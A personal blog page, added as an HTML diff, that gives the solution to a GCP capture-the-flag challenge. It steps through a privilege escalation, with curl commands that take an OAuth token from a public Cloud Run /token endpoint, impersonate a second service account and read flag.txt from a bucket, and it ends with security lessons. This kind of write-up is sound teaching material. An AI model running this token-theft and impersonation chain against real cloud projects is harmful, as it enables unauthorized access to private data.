@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Follow the Identity | Husain Challawala</title>
+  <link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+  <header>
+    <nav class="navbar">
+      <div class="logo">Husain Challawala</div>
+      <ul class="nav-links">
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="../projects.html">Projects</a></li>
+        <li><a href="../blog.html">Blog</a></li>
+        <li><a href="../contact.html">Contact</a></li>
+      </ul>
+      <div class="menu-toggle" id="mobile-menu">&#9776;</div>
+    </nav>
+  </header>
+
+  <main class="section blog-post">
+    <div class="container">
+      <article>
+        <div class="blog-post-header">
+          <h1>Follow the Identity</h1>
+          <p class="blog-meta">Published on March 2026</p>
+        </div>
+
+        <div class="blog-post-content">
+          <h1>Solution</h1>
+<p>This document outlines the intended solution path for the Apex Infrastructure challenge.</p>
+<h2>Overview of the Exploit Chain</h2>
+<p>The full attack flow is:</p>
+<ol>
+<li>Review Terraform infrastructure code from the Github repo.</li>
+<li>Identify GCP service accounts relationships, cloud storage bucket and a public Cloud Run service.</li>
+<li>Discover the <code>/token</code> endpoint for that cloud run service.</li>
+<li>Use that endpoint to obtain an access token for <code>automation-sa</code></li>
+<li>Use that token to impersonate <code>prod-sa</code></li>
+<li>Use the <code>prod-sa</code> token to access a storage bucket</li>
+<li>Retrieve <code>flag.txt</code></li>
+</ol>
+<hr>
+<h2>Step 1 – Review the Infrastructure Repository</h2>
+<p>Clone and inspect the Terraform configuration:</p>
+<pre><code class="language-bash">git clone &lt;repo-url&gt;
+cd Apex-Infrastructure
+</code></pre>
+<p>Carefully review the Terraform files.</p>
+<h2>Key Observations</h2>
+<h3>cloud_run.tf</h3>
+<ul>
+<li>A Cloud Run service is deployed.</li>
+<li>IAM binding grants <code>roles/run.invoker</code> to <code>allUsers</code>.</li>
+<li>The service runs as: automation-sa</li>
+</ul>
+<p>This means:
+The Cloud Run service is publicly accessible and executes with the permissions of <code>automation-sa</code>.</p>
+<hr>
+<h3>iam.tf</h3>
+<p>Two service accounts are defined:</p>
+<ul>
+<li><code>automation-sa</code></li>
+<li><code>prod-sa</code></li>
+</ul>
+<p>There is a critical IAM binding:
+- <code>automation-sa → roles/iam.serviceAccountTokenCreator → prod-sa</code></p>
+<p>This means:
+<code>automation-sa</code> is allowed to impersonate <code>prod-sa</code>.</p>
+<hr>
+<h3>storage.tf</h3>
+<p>A storage bucket exists:</p>
+<ul>
+<li><code>apex-infra-config-files</code></li>
+</ul>
+<p>IAM binding grants:
+- <code>prod-sa → roles/storage.objectViewer</code></p>
+<p>This means:
+<code>prod-sa</code> can read objects in the bucket (including <code>flag.txt</code>).</p>
+<hr>
+<h1>Step 2 – Identify the Entry Point</h1>
+<p>The public Cloud Run URL is found in a commit in the Apex-Infrastructure repo.</p>
+<p>Since the Cloud Run service is public, it can be accessed directly.</p>
+<p>The challenge exposes an endpoint:
+<code>/token</code>
+This is found through the README.md of the Apex-Infrastructure repo.</p>
+<p>This endpoint returns an OAuth access token belonging to:
+<code>automation-sa</code></p>
+<hr>
+<h1>Step 3 – Obtain automation-sa Access Token</h1>
+<p>Set your Cloud Run URL:
+- <code>CLOUD_RUN_URL=&lt;cloud-run-url&gt;</code></p>
+<p>Request a token:</p>
+<pre><code>AUTOMATION_TOKEN=$(curl -s $CLOUD_RUN_URL/token | jq -r .access_token)
+echo $AUTOMATION_TOKEN
+</code></pre>
+<p>You now possess an access token for:
+<code>automation-sa</code></p>
+<hr>
+<h1>Step 4 – Impersonate prod-sa</h1>
+<p>Because <code>automation-sa</code> has the role:
+<code>roles/iam.serviceAccountTokenCreator</code> on <code>prod-sa</code>, we can call the IAM Credentials API to generate a new access token.</p>
+<p>Run:</p>
+<pre><code>PROD_TOKEN=$(curl -s \
+  -X POST \
+  -H "Authorization: Bearer $AUTOMATION_TOKEN" \
+  -H "Content-Type: application/json" \
+  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/prod-sa@development-spring-2026.iam.gserviceaccount.com:generateAccessToken" \
+  -d '{
+        "scope": ["https://www.googleapis.com/auth/cloud-platform"]
+      }' | jq -r .accessToken)
+
+echo $PROD_TOKEN
+</code></pre>
+<p>You now have an access token for:
+<code>prod-sa</code></p>
+<hr>
+<h1>Step 5 – List Bucket Contents</h1>
+<p>Use the <code>prod-sa</code> token to list objects in the bucket:</p>
+<pre><code>curl -H "Authorization: Bearer $PROD_TOKEN" "https://storage.googleapis.com/storage/v1/b/apex-infra-config-files/o"
+</code></pre>
+<p>You should see:
+<code>flag.txt</code></p>
+<hr>
+<h1>Step 6 – Retrieve the Flag</h1>
+<p>Download the flag:</p>
+<pre><code>curl -H "Authorization: Bearer $PROD_TOKEN" "https://storage.googleapis.com/storage/v1/b/apex-infra-config-files/o/flag.txt?alt=media"
+</code></pre>
+<p>The response will contain the flag.</p>
+<hr>
+<h1>Why This Works</h1>
+<p>The vulnerability chain is:</p>
+<ol>
+<li>Public Cloud Run service running as a privileged service account</li>
+<li><code>/token</code> endpoint exposes an OAuth token</li>
+<li><code>automation-sa</code> can impersonate <code>prod-sa</code></li>
+<li><code>prod-sa</code> has storage viewer access</li>
+<li>The bucket contains sensitive data</li>
+</ol>
+<p>This creates a privilege escalation path via service account impersonation.</p>
+<hr>
+<h1>Security Lessons</h1>
+<ul>
+<li>Never expose raw service account tokens.</li>
+<li>Avoid granting <code>roles/iam.serviceAccountTokenCreator</code> unless absolutely necessary.</li>
+<li>Publicly accessible services running as privileged accounts create risk.</li>
+<li>Always audit IAM impersonation chains.</li>
+<li>Principle of least privilege must be enforced across service accounts.</li>
+</ul>
+<hr>
+<h1>Final Exploit Summary</h1>
+<p>Public Cloud Run  
+→ <code>/token</code> endpoint  
+→ automation-sa token  
+→ impersonate prod-sa  
+→ access bucket  
+→ retrieve flag</p>
+<hr>
+        </div>
+      </article>
+    </div>
+  </main>
+
+  <footer>
+    <p>© 2026 Husain Challawala. All rights reserved.</p>
+  </footer>
+
+  <script src="../script.js"></script>
+</body>
+</html>
